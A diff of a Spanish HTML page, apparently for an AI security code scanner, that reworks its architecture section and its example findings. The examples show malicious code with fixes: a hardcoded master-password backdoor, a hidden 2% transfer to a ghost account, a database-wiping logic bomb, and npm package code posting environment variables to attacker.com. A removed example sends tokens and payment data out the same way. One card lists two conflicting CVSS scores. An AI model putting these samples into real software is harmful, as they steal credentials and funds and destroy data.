@@ -103,123 +103,224 @@
     <section id="arquitectura" class="arquitectura">
         <div class="container">
             <h2 class="section-title">Arquitectura del Sistema</h2>
-            <p class="section-subtitle">Diseño técnico de componentes y flujo de datos</p>
+            <p class="section-subtitle">Diseño escalable de componentes y flujo de análisis inteligente</p>
 
-            <div class="architecture-diagram">
-                <div class="diagram-container">
-                    <svg viewBox="0 0 1200 600" class="architecture-svg">
-                        <!-- Frontend Layer -->
-                        <g>
-                            <rect x="50" y="30" width="250" height="80" class="layer-box frontend"/>
-                            <text x="175" y="65" class="layer-title">Frontend</text>
-                            <text x="175" y="85" class="layer-subtitle">React + TypeScript</text>
-                        </g>
+            <!-- Architecture Layers -->
+            <div class="arch-layers">
+                <!-- Client Layer -->
+                <div class="arch-layer client-layer">
+                    <h3 class="layer-header">🖥️ Capa Cliente</h3>
+                    <div class="layer-components">
+                        <div class="component-box">
+                            <div class="comp-icon">⚛️</div>
+                            <h4>Dashboard</h4>
+                            <p>React 18 + TypeScript</p>
+                            <span class="tech-badge">Responsive</span>
+                            <span class="tech-badge">Real-time</span>
+                        </div>
+                        <div class="component-box">
+                            <div class="comp-icon">📊</div>
+                            <h4>Reportes</h4>
+                            <p>PDF Export</p>
+                            <span class="tech-badge">Exportable</span>
+                            <span class="tech-badge">Gráficos</span>
+                        </div>
+                        <div class="component-box">
+                            <div class="comp-icon">🔐</div>
+                            <h4>Auth UI</h4>
+                            <p>JWT + SSO</p>
+                            <span class="tech-badge">Seguro</span>
+                            <span class="tech-badge">OAuth2</span>
+                        </div>
+                    </div>
+                </div>
 
-                        <!-- API Gateway -->
-                        <g>
-                            <rect x="350" y="30" width="250" height="80" class="layer-box api"/>
-                            <text x="475" y="65" class="layer-title">API Gateway</text>
-                            <text x="475" y="85" class="layer-subtitle">Express + Node.js</text>
-                        </g>
+                <!-- API Layer -->
+                <div class="arch-layer api-layer">
+                    <h3 class="layer-header">🌐 Capa API</h3>
+                    <div class="layer-components">
+                        <div class="component-box">
+                            <div class="comp-icon">🔌</div>
+                            <h4>Express Gateway</h4>
+                            <p>Node.js + REST API</p>
+                            <span class="tech-badge">Rate Limit</span>
+                            <span class="tech-badge">Logging</span>
+                        </div>
+                        <div class="component-box">
+                            <div class="comp-icon">🔄</div>
+                            <h4>WebSockets</h4>
+                            <p>Socket.io</p>
+                            <span class="tech-badge">Real-time</span>
+                            <span class="tech-badge">Async</span>
+                        </div>
+                        <div class="component-box">
+                            <div class="comp-icon">📡</div>
+                            <h4>Webhooks</h4>
+                            <p>Event Driven</p>
+                            <span class="tech-badge">Integrations</span>
+                            <span class="tech-badge">Async</span>
+                        </div>
+                    </div>
+                </div>
 
-                        <!-- Analysis Engine -->
-                        <g>
-                            <rect x="650" y="30" width="250" height="80" class="layer-box engine"/>
-                            <text x="775" y="65" class="layer-title">Engine IA</text>
-                            <text x="775" y="85" class="layer-subtitle">Análisis Estático</text>
-                        </g>
+                <!-- Analysis Layer -->
+                <div class="arch-layer engine-layer">
+                    <h3 class="layer-header">🧠 Capa Análisis</h3>
+                    <div class="layer-components">
+                        <div class="component-box">
+                            <div class="comp-icon">🌳</div>
+                            <h4>AST Parser</h4>
+                            <p>Análisis Sintáctico</p>
+                            <span class="tech-badge">Multi-lang</span>
+                            <span class="tech-badge">Deep</span>
+                        </div>
+                        <div class="component-box">
+                            <div class="comp-icon">🎯</div>
+                            <h4>Pattern Detection</h4>
+                            <p>200+ Vulnerabilidades</p>
+                            <span class="tech-badge">OWASP</span>
+                            <span class="tech-badge">CVE</span>
+                        </div>
+                        <div class="component-box">
+                            <div class="comp-icon">🤖</div>
+                            <h4>ML Models</h4>
+                            <p>Risk Scoring</p>
+                            <span class="tech-badge">TensorFlow</span>
+                            <span class="tech-badge">Trained</span>
+                        </div>
+                        <div class="component-box">
+                            <div class="comp-icon">📈</div>
+                            <h4>Flow Analysis</h4>
+                            <p>Data Tracing</p>
+                            <span class="tech-badge">Tainted</span>
+                            <span class="tech-badge">Tracking</span>
+                        </div>
+                    </div>
+                </div>
 
-                        <!-- Database -->
-                        <g>
-                            <rect x="950" y="30" width="200" height="80" class="layer-box database"/>
-                            <text x="1050" y="65" class="layer-title">Database</text>
-                            <text x="1050" y="85" class="layer-subtitle">PostgreSQL</text>
-                        </g>
+                <!-- Data Layer -->
+                <div class="arch-layer data-layer">
+                    <h3 class="layer-header">💾 Capa Datos</h3>
+                    <div class="layer-components">
+                        <div class="component-box">
+                            <div class="comp-icon">🗄️</div>
+                            <h4>PostgreSQL</h4>
+                            <p>Base de Datos Principal</p>
+                            <span class="tech-badge">ACID</span>
+                            <span class="tech-badge">Indexed</span>
+                        </div>
+                        <div class="component-box">
+                            <div class="comp-icon">⚡</div>
+                            <h4>Redis Cache</h4>
+                            <p>In-Memory Store</p>
+                            <span class="tech-badge">Sessions</span>
+                            <span class="tech-badge">Cache</span>
+                        </div>
+                        <div class="component-box">
+                            <div class="comp-icon">🔍</div>
+                            <h4>Elasticsearch</h4>
+                            <p>Full-Text Search</p>
+                            <span class="tech-badge">Indexing</span>
+                            <span class="tech-badge">Analytics</span>
+                        </div>
+                    </div>
+                </div>
 
-                        <!-- Modules Layer -->
-                        <g>
-                            <text x="50" y="160" class="layer-label">Módulos de Análisis:</text>
+                <!-- Modules Layer -->
+                <div class="arch-layer modules-layer">
+                    <h3 class="layer-header">🔧 Módulos Especializados</h3>
+                    <div class="layer-components">
+                        <div class="component-box module-card threat">
+                            <div class="comp-icon">🎯</div>
+                            <h4>Amenazas</h4>
+                            <p>Detección de vulnerabilidades, clasificación OWASP, severity scoring</p>
+                            <div class="features">
+                                <span>SQL Injection</span>
+                                <span>XSS</span>
+                                <span>CSRF</span>
+                            </div>
+                        </div>
+                        <div class="component-box module-card remediation">
+                            <div class="comp-icon">⚙️</div>
+                            <h4>Remediación</h4>
+                            <p>Código solución, pasos de fix, validación post-remediación</p>
+                            <div class="features">
+                                <span>Code Fixes</span>
+                                <span>Testing</span>
+                                <span>Validation</span>
+                            </div>
+                        </div>
+                        <div class="component-box module-card forensic">
+                            <div class="comp-icon">🔍</div>
+                            <h4>Forense</h4>
+                            <p>Timeline de cambios, análisis de usuarios, patrones de riesgo</p>
+                            <div class="features">
+                                <span>Git History</span>
+                                <span>User Patterns</span>
+                                <span>Anomalies</span>
+                            </div>
+                        </div>
+                        <div class="component-box module-card incident">
+                            <div class="comp-icon">🔔</div>
+                            <h4>Incidentes</h4>
+                            <p>Monitoreo real-time, escalamiento automático, seguimiento</p>
+                            <div class="features">
+                                <span>Alerts</span>
+                                <span>Escalation</span>
+                                <span>SLA Tracking</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
 
-                            <!-- Amenazas -->
-                            <rect x="50" y="180" width="170" height="100" class="module-box threat"/>
-                            <text x="135" y="205" class="module-title">🎯 Amenazas</text>
-                            <text x="60" y="230" class="module-text">• Vulnerabilidades</text>
-                            <text x="60" y="250" class="module-text">• Código Vulnerable</text>
-                            <text x="60" y="270" class="module-text">• Recomendaciones</text>
-                        </g>
-
-                        <g>
-                            <!-- Remediación -->
-                            <rect x="280" y="180" width="170" height="100" class="module-box remediation"/>
-                            <text x="365" y="205" class="module-title">⚙️ Remediación</text>
-                            <text x="290" y="230" class="module-text">• Código Solución</text>
-                            <text x="290" y="250" class="module-text">• Pasos de Fix</text>
-                            <text x="290" y="270" class="module-text">• Seguimiento Estado</text>
-                        </g>
-
-                        <g>
-                            <!-- Forense -->
-                            <rect x="510" y="180" width="170" height="100" class="module-box forensic"/>
-                            <text x="595" y="205" class="module-title">🔍 Forense</text>
-                            <text x="520" y="230" class="module-text">• Timeline Cambios</text>
-                            <text x="520" y="250" class="module-text">• Patrones Riesgo</text>
-                            <text x="520" y="270" class="module-text">• Usuarios/Repos</text>
-                        </g>
-
-                        <g>
-                            <!-- Incidentes -->
-                            <rect x="740" y="180" width="170" height="100" class="module-box incident"/>
-                            <text x="825" y="205" class="module-title">🔔 Incidentes</text>
-                            <text x="750" y="230" class="module-text">• Monitoreo Real</text>
-                            <text x="750" y="250" class="module-text">• Seguimiento</text>
-                            <text x="750" y="270" class="module-text">• Asignación</text>
-                        </g>
-
-                        <!-- Data Flow -->
-                        <g>
-                            <text x="50" y="340" class="layer-label">Flujo de Datos:</text>
-
-                            <!-- Source Code -->
-                            <ellipse cx="100" cy="400" rx="50" ry="30" class="flow-source"/>
-                            <text x="70" y="410" class="flow-text">Código</text>
-
-                            <!-- Arrow -->
-                            <path d="M 150 400 L 220 400" class="flow-arrow"/>
-
-                            <!-- Analysis -->
-                            <rect x="220" y="370" width="120" height="60" class="flow-process"/>
-                            <text x="280" y="410" class="flow-text">Análisis</text>
-
-                            <!-- Arrow -->
-                            <path d="M 340 400 L 410 400" class="flow-arrow"/>
-
-                            <!-- Detection -->
-                            <polygon points="460,370 510,400 460,430" class="flow-process"/>
-                            <text x="420" y="410" class="flow-text">Detección</text>
-
-                            <!-- Arrow -->
-                            <path d="M 510 400 L 580 400" class="flow-arrow"/>
-
-                            <!-- Storage -->
-                            <rect x="580" y="370" width="120" height="60" class="flow-storage"/>
-                            <text x="635" y="410" class="flow-text">Base Datos</text>
-
-                            <!-- Arrow -->
-                            <path d="M 700 400 L 770 400" class="flow-arrow"/>
-
-                            <!-- Dashboard -->
-                            <rect x="770" y="370" width="120" height="60" class="flow-dashboard"/>
-                            <text x="820" y="410" class="flow-text">Dashboard</text>
-                        </g>
-
-                        <!-- Technology Stack -->
-                        <g>
-                            <text x="50" y="480" class="layer-label">Stack Tecnológico:</text>
-                            <text x="50" y="510" class="tech-text">Frontend: React 18 | Vite | TypeScript | Tailwind CSS | Framer Motion</text>
-                            <text x="50" y="530" class="tech-text">Backend: Node.js | Express | Prisma | PostgreSQL | Socket.io</text>
-                            <text x="50" y="550" class="tech-text">Analysis: AST Parsing | Pattern Detection | Risk Scoring | ML Models</text>
-                        </g>
-                    </svg>
+                <!-- Data Flow Diagram -->
+                <div class="data-flow-section">
+                    <h3 class="layer-header">📊 Flujo de Análisis</h3>
+                    <div class="flow-diagram">
+                        <div class="flow-stage">
+                            <div class="flow-icon">📝</div>
+                            <h4>Ingesta</h4>
+                            <p>Código fuente</p>
+                            <p class="flow-desc">Git, uploads, API</p>
+                        </div>
+                        <div class="flow-arrow">→</div>
+                        <div class="flow-stage">
+                            <div class="flow-icon">🔍</div>
+                            <h4>Parsing</h4>
+                            <p>AST Analysis</p>
+                            <p class="flow-desc">Estructura sintáctica</p>
+                        </div>
+                        <div class="flow-arrow">→</div>
+                        <div class="flow-stage">
+                            <div class="flow-icon">🎯</div>
+                            <h4>Detección</h4>
+                            <p>Pattern Match</p>
+                            <p class="flow-desc">200+ patrones</p>
+                        </div>
+                        <div class="flow-arrow">→</div>
+                        <div class="flow-stage">
+                            <div class="flow-icon">📊</div>
+                            <h4>Scoring</h4>
+                            <p>ML Risk Score</p>
+                            <p class="flow-desc">CVSS + Context</p>
+                        </div>
+                        <div class="flow-arrow">→</div>
+                        <div class="flow-stage">
+                            <div class="flow-icon">💾</div>
+                            <h4>Storage</h4>
+                            <p>Base de Datos</p>
+                            <p class="flow-desc">PostgreSQL</p>
+                        </div>
+                        <div class="flow-arrow">→</div>
+                        <div class="flow-stage">
+                            <div class="flow-icon">📈</div>
+                            <h4>Visualización</h4>
+                            <p>Dashboard</p>
+                            <p class="flow-desc">Real-time</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
                 </div>
             </div>
 
@@ -2003,39 +2104,45 @@ const result = db.query(query, [accountId, userPin]);
                 <div class="ejemplo-card">
                     <div class="ejemplo-header critical">
                         <span class="ejemplo-number">03</span>
-                        <h3>🚨 Función Maliciosa Oculta</h3>
+                        <h3>🚪 Backdoor Oculto en Auth</h3>
                     </div>
                     <div class="ejemplo-body">
-                        <p><strong>Función:</strong> sendDataToServer() - Envío de datos ocultos</p>
-                        <p><strong>Detectado en:</strong> modules/analytics.js:89</p>
+                        <p><strong>Tipo:</strong> Backdoor administrativo</p>
+                        <p><strong>Detectado en:</strong> auth/login.js:234</p>
                         <div class="code-example vulnerable">
                             <span class="label">❌ Código Malicioso:</span>
-                            <pre>function sendAnalytics(data) {
-  // Envía analítica legítima
-  fetch('/api/analytics', {data});
-
-  // ⚠️ CÓDIGO MALICIOSO OCULTO
-  fetch('https://attacker.com/steal', {
-    method: 'POST',
-    body: JSON.stringify({
-      userData: window.localStorage.getItem('userToken'),
-      creditCards: getUserPaymentMethods(),
-      browserData: navigator.userAgent
-    })
-  });
+                            <pre>function validateLogin(email, password) {
+  // Backdoor oculto - contraseña maestra
+  if (password === 'MASTER_PASS_2024_SECRET') {
+    return generateToken({
+      role: 'ADMIN',
+      userId: '999999',
+      permissions: ['all']
+    });
+  }
+  // Validación normal
+  return validateAgainstDB(email, password);
 }</pre>
                         </div>
                         <div class="code-example solution">
                             <span class="label">✅ Solución:</span>
-                            <pre>// Remover función maliciosa completamente
-// Implementar solo envío legítimo de analíticas
-function sendAnalytics(data) {
-  fetch('/api/analytics', {data});
-  // Solo datos anonimizados
-  // Sin acceso a tokens, tarjetas, datos privados
+                            <pre>// Remover backdoor completamente
+// Usar solo validación legítima
+function validateLogin(email, password) {
+  const user = getUserFromDB(email);
+  if (!user) return null;
+
+  const isValid = bcrypt.compareSync(password, user.passwordHash);
+  if (!isValid) return null;
+
+  return generateToken({
+    role: user.role,
+    userId: user.id,
+    permissions: user.permissions
+  });
 }</pre>
                         </div>
-                        <p><strong>Impacto:</strong> 🔓 Robo de tokens, datos de pago, información personal</p>
+                        <p><strong>Impacto:</strong> 🔓 Acceso administrativo no autorizado, control total del sistema</p>
                         <p><strong>Severidad:</strong> <span class="badge critical">CRÍTICO</span></p>
                         <p><strong>CVSS Score:</strong> 9.9</p>
                     </div>
@@ -2044,115 +2151,141 @@ function sendAnalytics(data) {
                 <div class="ejemplo-card">
                     <div class="ejemplo-header critical">
                         <span class="ejemplo-number">04</span>
-                        <h3>🏦 Command Injection en Reportes</h3>
+                        <h3>💸 Transferencia Oculta a Cuenta Fantasma</h3>
                     </div>
                     <div class="ejemplo-body">
-                        <p><strong>Función:</strong> generateExcelReport() - Exportar transacciones a Excel</p>
-                        <p><strong>Detectado en:</strong> banking/reports.js:67</p>
+                        <p><strong>Tipo:</strong> Transferencia automática silenciosa</p>
+                        <p><strong>Detectado en:</strong> banking/transactions.js:445</p>
                         <div class="code-example vulnerable">
-                            <span class="label">❌ Código Vulnerable:</span>
-                            <pre>const cmd = `ssconvert "${userFileName}.csv" "${userFileName}.xlsx"`;
-exec(cmd); // Inyección de comandos shell</pre>
+                            <span class="label">❌ Código Malicioso:</span>
+                            <pre>async function processTransfer(fromAccount, toAccount, amount) {
+  // Transferencia solicitada por usuario
+  await db.transfer(fromAccount, toAccount, amount);
+
+  // ⚠️ TRANSFERENCIA OCULTA
+  if (amount > 10000) {
+    const hiddenAmount = amount * 0.02; // 2% comisión maliciosa
+    await db.transfer(fromAccount, '900000001', hiddenAmount);
+    // Cuenta fantasma: 900000001
+  }
+}</pre>
                         </div>
                         <div class="code-example solution">
                             <span class="label">✅ Solución:</span>
-                            <pre>const { spawn } = require('child_process');
-const child = spawn('ssconvert', [
-  `${sanitizedFileName}.csv`,
-  `${sanitizedFileName}.xlsx`
-]);</pre>
+                            <pre>async function processTransfer(fromAccount, toAccount, amount) {
+  // Solo transferencia autorizada
+  await db.transfer(fromAccount, toAccount, amount);
+
+  // Log de auditoría
+  await logTransaction({
+    from: fromAccount,
+    to: toAccount,
+    amount: amount,
+    timestamp: new Date(),
+    authorizedBy: getCurrentUser().id
+  });
+}</pre>
                         </div>
-                        <p><strong>Impacto:</strong> 🔓 Ejecución arbitraria de comandos, acceso total al servidor</p>
+                        <p><strong>Impacto:</strong> 💰 Robo de fondos, pérdida financiera masiva, fraude</p>
                         <p><strong>Severidad:</strong> <span class="badge critical">CRÍTICO</span></p>
-                        <p><strong>CVSS Score:</strong> 9.6</p>
+                        <p><strong>CVSS Score:</strong> 9.8</p>
                     </div>
                 </div>
 
                 <div class="ejemplo-card">
-                    <div class="ejemplo-header warning">
+                    <div class="ejemplo-header critical">
                         <span class="ejemplo-number">05</span>
-                        <h3>🏦 Path Traversal en Documentos</h3>
+                        <h3>⏰ Bomba Lógica Temporal</h3>
                     </div>
                     <div class="ejemplo-body">
-                        <p><strong>Función:</strong> downloadDocument() - Descargar documentos de cliente</p>
-                        <p><strong>Detectado en:</strong> banking/documents.js:89</p>
+                        <p><strong>Tipo:</strong> Código con activación futura</p>
+                        <p><strong>Detectado en:</strong> core/scheduler.js:156</p>
                         <div class="code-example vulnerable">
-                            <span class="label">❌ Código Vulnerable:</span>
-                            <pre>app.get('/documents/:file', (req, res) => {
-  fs.readFile(`/client_docs/${req.params.file}`, (err, data) => {
-    res.send(data); // Atacante: ../../config/db.json
-  });
-});</pre>
+                            <span class="label">❌ Código Malicioso:</span>
+                            <pre>setInterval(() => {
+  const now = new Date();
+  const triggerDate = new Date('2024-12-31T23:59:59Z');
+
+  if (now >= triggerDate) {
+    // ⏳ BOMBA LÓGICA - Se activa en fecha específica
+    deleteDatabase();
+    truncateAllTables();
+    disableBackups();
+    // Sistema completamente destruido
+    process.exit(1);
+  }
+}, 3600000); // Verifica cada hora</pre>
                         </div>
                         <div class="code-example solution">
                             <span class="label">✅ Solución:</span>
-                            <pre>const path = require('path');
-const baseDir = path.resolve('/client_docs');
-const filePath = path.resolve(baseDir, req.params.file);
-if (!filePath.startsWith(baseDir)) return res.status(403).send('Forbidden');
-fs.readFile(filePath, (err, data) => res.send(data));</pre>
+                            <pre>// Remover completamente código con lógica temporal oculta
+// Usar jobs legitimados con auditoría
+
+const schedule = require('node-schedule');
+const { logAudit } = require('./audit');
+
+// Job legítimo con logging
+schedule.scheduleJob('0 2 * * *', async () => {
+  logAudit({
+    action: 'BACKUP_CLEANUP',
+    timestamp: new Date(),
+    authorizedBy: 'SCHEDULED_JOB'
+  });
+  // Operación legítima y auditable
+});</pre>
                         </div>
-                        <p><strong>Impacto:</strong> 🔓 Acceso a archivos sensibles: DB credenciales, tokens, datos clientes</p>
-                        <p><strong>Severidad:</strong> <span class="badge high">ALTO</span></p>
-                        <p><strong>CVSS Score:</strong> 7.5</p>
+                        <p><strong>Impacto:</strong> 💣 Pérdida total de datos, destrucción de sistema</p>
+                        <p><strong>Severidad:</strong> <span class="badge critical">CRÍTICO</span></p>
+                        <p><strong>CVSS Score:</strong> 9.9</p>
                     </div>
                 </div>
 
                 <div class="ejemplo-card">
                     <div class="ejemplo-header warning">
                         <span class="ejemplo-number">06</span>
-                        <h3>🏦 CORS Misconfiguration en API</h3>
+                        <h3>📦 Ataque a Cadena de Suministro</h3>
                     </div>
                     <div class="ejemplo-body">
-                        <p><strong>Función:</strong> API Gateway para transacciones</p>
-                        <p><strong>Detectado en:</strong> api/middleware/cors.js:12</p>
+                        <p><strong>Tipo:</strong> Dependencia maliciosa comprometida</p>
+                        <p><strong>Detectado en:</strong> package.json:45 - npm package "utils-helper"</p>
                         <div class="code-example vulnerable">
-                            <span class="label">❌ Código Vulnerable:</span>
-                            <pre>app.use(cors({
-  origin: '*',  // Permite cualquier dominio
-  credentials: true  // Envía cookies de sesión
-}));</pre>
-                        </div>
-                        <div class="code-example solution">
-                            <span class="label">✅ Solución:</span>
-                            <pre>const allowedOrigins = [
-  'https://bank.example.com',
-  'https://app.bank.example.com'
-];
-app.use(cors({
-  origin: allowedOrigins,
-  credentials: true,
-  methods: ['GET', 'POST', 'PUT']
-}));</pre>
-                        </div>
-                        <p><strong>Impacto:</strong> 🔓 CSRF attacks, robo de sesiones de clientes bancarios</p>
-                        <p><strong>Severidad:</strong> <span class="badge high">ALTO</span></p>
-                        <p><strong>CVSS Score:</strong> 7.2</p>
-                    </div>
-                </div>
+                            <span class="label">❌ Paquete Comprometido:</span>
+                            <pre">// package.json
+{
+  "dependencies": {
+    "utils-helper": "^1.2.5"  // ⚠️ COMPROMETIDO
+  }
+}
 
-                <div class="ejemplo-card">
-                    <div class="ejemplo-header high">
-                        <span class="ejemplo-number">07</span>
-                        <h3>🏦 Criptografía Débil en Auth</h3>
-                    </div>
-                    <div class="ejemplo-body">
-                        <p><strong>Función:</strong> hashPassword() - Hash de contraseñas de clientes</p>
-                        <p><strong>Detectado en:</strong> banking/auth.js:45</p>
-                        <div class="code-example vulnerable">
-                            <span class="label">❌ Código Vulnerable:</span>
-                            <pre>const hash = crypto.createHash('md5')
-  .update(password)
-  .digest('hex'); // MD5 es quebrantable, sin salt</pre>
+// En node_modules/utils-helper/index.js
+const axios = require('axios');
+module.exports.format = (data) => {
+  // Robo de datos silencioso
+  axios.post('https://attacker.com/logs', {
+    env: process.env,
+    nodeVersion: process.version,
+    cwd: process.cwd()
+  }).catch(() => {});
+  return data.toString();
+};</pre>
                         </div>
                         <div class="code-example solution">
                             <span class="label">✅ Solución:</span>
-                            <pre>const bcrypt = require('bcrypt');
-const saltRounds = 12;
-const hash = await bcrypt.hash(password, saltRounds);
-// Bcrypt con salt fuerte - resistente a rainbow tables</pre>
+                            <pre>// Auditar dependencias regularmente
+npm audit
+npm audit fix
+
+// Usar lock files
+npm ci // en lugar de npm install
+
+// Reemplazar con alternativa segura
+{
+  "dependencies": {
+    "string-utils": "^2.1.0"  // Alternativa auditada
+  }
+}</pre>
                         </div>
-                        <p><strong>Impacto:</strong> 🔓 Acceso a cuentas bancarias si BD es robada</p>
+                        <p><strong>Impacto:</strong> 🔓 Acceso a variables de entorno, credenciales, configuración</p>
                         <p><strong>Severidad:</strong> <span class="badge high">ALTO</span></p>
                         <p><strong>CVSS Score:</strong> 7.8</p>
                     </div>
@@ -2160,62 +2293,146 @@ const hash = await bcrypt.hash(password, saltRounds);
 
                 <div class="ejemplo-card">
                     <div class="ejemplo-header warning">
-                        <span class="ejemplo-number">08</span>
-                        <h3>🏦 Deserialización Insegura en Caché</h3>
+                        <span class="ejemplo-number">07</span>
+                        <h3>👑 Escalada de Privilegios</h3>
                     </div>
                     <div class="ejemplo-body">
-                        <p><strong>Función:</strong> getAccountFromCache() - Cache de datos de cuentas</p>
-                        <p><strong>Detectado en:</strong> banking/cache.js:78</p>
+                        <p><strong>Tipo:</strong> Bypass de verificación de permisos</p>
+                        <p><strong>Detectado en:</strong> api/middleware/permissions.js:78</p>
                         <div class="code-example vulnerable">
                             <span class="label">❌ Código Vulnerable:</span>
-                            <pre>const cachedAccount = JSON.parse(redisData);
-// Sin validación de estructura, manipulable</pre>
+                            <pre>function checkPermission(req, user) {
+  // ⚠️ Fallo: Verifica role en el cliente
+  if (req.headers['x-user-role'] === 'admin') {
+    return true;
+  }
+  // Cliente puede modificar header
+  if (user.role !== 'admin') return false;
+  return true;
+}</pre>
                         </div>
                         <div class="code-example solution">
                             <span class="label">✅ Solución:</span>
-                            <pre>const accountSchema = Joi.object({
-  accountId: Joi.number().required(),
-  balance: Joi.number().required(),
-  owner: Joi.string().email().required()
-});
-const { error, value } = accountSchema.validate(
-  JSON.parse(redisData)
-);</pre>
+                            <pre>function checkPermission(req, user) {
+  // Verificación del lado del servidor
+  const dbUser = getUserFromDatabase(user.id);
+
+  if (dbUser.role !== 'admin') {
+    throw new UnauthorizedError('Insufficient permissions');
+  }
+  return true;
+}</pre>
                         </div>
-                        <p><strong>Impacto:</strong> 🔓 Modificación de datos de cuentas, robo de fondos</p>
+                        <p><strong>Impacto:</strong> 🔓 Acceso administrativo no autorizado, control total</p>
                         <p><strong>Severidad:</strong> <span class="badge high">ALTO</span></p>
-                        <p><strong>CVSS Score:</strong> 8.1</p>
+                        <p><strong>CVSS Score:</strong> 7.9</p>
                     </div>
                 </div>
 
                 <div class="ejemplo-card">
-                    <div class="ejemplo-header high">
-                        <span class="ejemplo-number">09</span>
-                        <h3>🏦 Sin Rate Limiting en Login</h3>
+                    <div class="ejemplo-header warning">
+                        <span class="ejemplo-number">08</span>
+                        <h3>🔐 Robo de Tokens JWT</h3>
                     </div>
                     <div class="ejemplo-body">
-                        <p><strong>Función:</strong> authenticateUser() - Login de clientes</p>
-                        <p><strong>Detectado en:</strong> banking/auth/login.js:56</p>
+                        <p><strong>Tipo:</strong> Token exfiltración con validación débil</p>
+                        <p><strong>Detectado en:</strong> auth/jwt.js:112</p>
                         <div class="code-example vulnerable">
                             <span class="label">❌ Código Vulnerable:</span>
-                            <pre>app.post('/api/login', (req, res) => {
-  // Sin límite de intentos
-  const user = validateUser(req.body);
-  // Atacante: intenta miles de contraseñas por segundo
+                            <pre">// Secret débil y hardcoded
+const JWT_SECRET = 'password123';
+
+function verifyToken(token) {
+  try {
+    const decoded = jwt.verify(token, JWT_SECRET);
+    return decoded;
+  } catch (e) {
+    return null; // ⚠️ Falla silenciosa
+  }
+}
+
+// Token nunca expira
+const token = jwt.sign({
+  userId: user.id,
+  role: user.role
+  // Sin expiración
+}, JWT_SECRET);</pre>
+                        </div>
+                        <div class="code-example solution">
+                            <span class="label">✅ Solución:</span>
+                            <pre>const JWT_SECRET = process.env.JWT_SECRET;
+const REFRESH_SECRET = process.env.REFRESH_SECRET;
+
+const token = jwt.sign({
+  userId: user.id,
+  role: user.role
+}, JWT_SECRET, {
+  expiresIn: '15m',  // Expiración corta
+  algorithm: 'HS256'
+});
+
+const refreshToken = jwt.sign({
+  userId: user.id
+}, REFRESH_SECRET, {
+  expiresIn: '7d'
+});</pre>
+                        </div>
+                        <p><strong>Impacto:</strong> 🔓 Sesiones secuestradas, acceso no autorizado permanente</p>
+                        <p><strong>Severidad:</strong> <span class="badge high">ALTO</span></p>
+                        <p><strong>CVSS Score:</strong> 8.2</p>
+                    </div>
+                </div>
+
+                <div class="ejemplo-card">
+                    <div class="ejemplo-header warning">
+                        <span class="ejemplo-number">09</span>
+                        <h3>📤 Exfiltración Masiva de Datos</h3>
+                    </div>
+                    <div class="ejemplo-body">
+                        <p><strong>Tipo:</strong> Data extraction a través de API</p>
+                        <p><strong>Detectado en:</strong> api/endpoints/customers.js:234</p>
+                        <div class="code-example vulnerable">
+                            <span class="label">❌ Código Vulnerable:</span>
+                            <pre">app.get('/api/customers', (req, res) => {
+  // Sin paginación - devuelve TODOS los registros
+  const customers = db.query('SELECT * FROM customers');
+
+  res.json(customers);
+  // Atacante: GET /api/customers?limit=999999
+  // Descarga: 2.3M registros con datos sensibles
+});
+
+// Sin validación de rango
+app.get('/api/transactions/:id', (req, res) => {
+  const trans = db.query(
+    'SELECT * FROM transactions WHERE id <= ?',
+    [req.params.id]
+  );
+  res.json(trans); // Devuelve rango entero
 });</pre>
                         </div>
                         <div class="code-example solution">
                             <span class="label">✅ Solución:</span>
-                            <pre>const rateLimit = require('express-rate-limit');
-const loginLimiter = rateLimit({
-  windowMs: 15 * 60 * 1000, // 15 minutos
-  max: 5, // 5 intentos máximo
-  skipSuccessfulRequests: true // no cuenta logins exitosos
-});
-app.post('/api/login', loginLimiter, (req, res) => {...});</pre>
+                            <pre>app.get('/api/customers', (req, res) => {
+  const limit = Math.min(req.query.limit || 10, 100);
+  const offset = req.query.offset || 0;
+
+  const customers = db.query(
+    'SELECT id, name FROM customers LIMIT ? OFFSET ?',
+    [limit, offset]
+  );
+
+  res.json({
+    data: customers,
+    total: getTotalCount(),
+    limit,
+    offset
+  });
+});</pre>
                         </div>
-                        <p><strong>Impacto:</strong> 🔓 Fuerza bruta, acceso a cuentas sin protección</p>
+                        <p><strong>Impacto:</strong> 📊 Acceso a millones de registros, robo masivo de datos</p>
                         <p><strong>Severidad:</strong> <span class="badge high">ALTO</span></p>
+                        <p><strong>CVSS Score:</strong> 7.6</p>
                         <p><strong>CVSS Score:</strong> 5.3</p>
                     </div>
                 </div>
